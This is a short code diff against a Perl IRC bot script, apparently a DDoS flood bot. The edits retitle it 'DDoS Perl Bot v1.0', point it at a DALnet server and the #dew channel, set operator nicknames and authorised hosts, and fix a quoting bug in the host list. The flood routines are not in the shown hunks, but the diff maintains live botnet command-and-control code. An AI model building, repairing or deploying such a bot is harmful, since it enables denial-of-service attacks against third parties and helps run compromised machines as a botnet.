@@ -119,10 +119,10 @@ my @rircname = ("abbore","ably","abyss","acrima","aerodream","afkdemon","ainther
  
 my $ircname = $rircname[rand scalar @rircname];
  
-## my @rrealname = ("4,1[ lilmoe's DDoS Security Team ]",
-##                                  "4,1 /!\ lilmoe's DDoS Security Team /!\ ",
+## my @rrealname = ("4,1[ lilmoe Security Team ]",
+##                                  "4,1 /!\ DDoS Security Team /!\ ",
 ##                                  "12,1<///8,1///4,1###>",
-##                  "2,1---=== 4,1lilmoe's  DDoS Security Team 2,1===---");
+##                  "2,1---=== 4,1 DDoS Security Team 2,1===---");
 ## chop (my $realname = $rrealname[rand scalar @rrealname]);
  
 chop (my $realname = $rircname[rand scalar @rircname]);
@@ -133,17 +133,17 @@ chop (my $realname = $rircname[rand scalar @rircname]);
 my $nick =$rircname[rand scalar @rircname];
 
 
-$server = 'bifrost.ca.us.dal.net' unless $server;
+$server = 'irc.dal.net' unless $server;
 my $port = '6667';
  
 my $linas_max='8';
 my $sleep='5';
  
 my $homedir = "/tmp";
-my $version = 'Perl Bot v6.9 by lilmoe';
+my $version = 'DDoS Perl Bot v1.0';
  
 my @admins = ("lilmoe","moey");
-my @hostauth = ("lilmoe.store","same.shit.vc);
+my @hostauth = ("lilmoe.store","same.shit.vc");
 my @channels = ("#dew");
  
 my $pacotes = 1;
